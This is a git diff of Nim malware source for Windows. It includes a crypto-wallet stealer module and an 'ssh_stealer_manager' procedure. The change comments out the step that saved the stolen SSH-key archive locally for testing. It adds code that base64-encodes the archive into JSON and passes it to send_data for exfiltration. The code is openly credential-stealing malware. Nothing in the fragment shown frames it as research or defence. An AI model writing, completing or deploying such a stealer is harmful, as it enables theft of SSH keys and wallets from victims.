@@ -1,4 +1,4 @@
-import os, strutils, times, json
+import os, strutils, times, json,base64
 import winim/lean
 
 import crypto_wallets/wallet_stealer
@@ -38,8 +38,18 @@ proc ssh_stealer_manager()=
       echo "\n[+] Archive créée: ", zipData.len, " bytes"
 
     # Sauvegarder localement pour test
-    writeFile("ssh_keys_test.zip", zipData)
-    echo "[+] Sauvegardé: ssh_keys_test.zip"
+    # writeFile("ssh_keys_test.zip", zipData)
+    # echo "[+] Sauvegardé: ssh_keys_test.zip"
+
+    let json_data = %*{
+      "files": [
+        {
+          "filename": "ssh_key",
+          "data": encode(zipData)
+        }
+      ]
+    }
+    send_data(json_data)
 
 
 proc system_info_manager()=
